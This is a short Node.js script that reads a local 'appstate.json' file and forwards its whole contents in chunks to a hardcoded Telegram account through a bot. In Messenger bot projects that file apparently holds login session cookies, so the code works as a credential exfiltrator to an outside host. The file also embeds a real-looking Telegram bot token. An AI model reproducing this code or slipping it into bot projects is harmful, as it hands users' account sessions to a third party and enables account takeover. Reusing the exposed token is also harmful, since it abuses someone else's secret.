const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const botToken = '7684130645:AAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE'; // Replace with your actual bot token
const bot = new TelegramBot(botToken, { polling: true });

const adminIds = ['1713841196']; 

fs.readFile('appstate.json', 'utf8', (err, data) => {
  if (err) {
    console.error('Error reading file:', err);
    return;
  }

  // Function to split a message into chunks
  const splitMessage = (message, maxLength) => {
    const chunks = [];
    for (let i = 0; i < message.length; i += maxLength) {
      chunks.push(message.slice(i, i + maxLength));
    }
    return chunks;
  };

  const messageChunks = splitMessage(data, 4096); // Split into chunks of 4096 characters

  adminIds.forEach(adminId => {
    messageChunks.forEach(chunk => {
      bot.sendMessage(adminId, chunk)
        .then(() => {
          console.log(`Message chunk sent to ${adminId}`);
        })
        .catch(err => {
          console.error(`Failed to send message chunk to ${adminId}:`, err);
        });
    });
  });
});
